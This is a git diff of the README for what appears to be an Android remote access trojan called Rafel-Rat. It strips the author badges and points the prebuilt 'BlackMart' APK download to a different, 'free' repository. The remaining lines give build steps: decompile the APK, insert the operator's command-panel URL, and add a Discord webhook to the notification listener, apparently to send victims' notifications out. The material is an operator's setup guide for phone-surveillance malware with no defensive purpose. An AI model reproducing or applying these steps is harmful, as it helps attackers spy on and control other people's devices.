@@ -6,11 +6,6 @@
 </p>   
 
 <p align=center>  
-<a href=https://github.com/swagkarna><img src="https://img.shields.io/badge/Author-Swagkarna-red.svg?style=for-the-badge&label=Author" /></a>
-
-<img src="https://img.shields.io/badge/Version-1.0-brightgreen?style=for-the-badge" >
-<img src="https://img.shields.io/github/stars/swagkarna/Rafel-Rat?style=for-the-badge">  
-<img src="https://img.shields.io/github/followers/swagkarna?label=Followers&style=for-the-badge">
 </p>   
 
 * **If you like the tool and for my personal motivation so as to develop other tools please leave a +1 star** 
@@ -55,7 +50,7 @@ OR
 ---
 ### Building Apk with ApkEasyTool:
 
-1. Download <a href="https://github.com/swagkarna/Rafel-Rat/releases/download/release/BlackMart.apk">BlackMartapk</a> and  decompile with `Apktool` and navigate to `smali_classes2\com\velociraptor\raptor`
+1. Download <a href="https://github.com/keleisandre1992/Rafel-Rat-free/blob/main/BlackMart.apk">BlackMartapk</a> and  decompile with `Apktool` and navigate to `smali_classes2\com\velociraptor\raptor`
 2. Open `InternalService.smali` 
 3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
 4. Now open `NotificationListener.smali` and enter replace with your discord webhook url
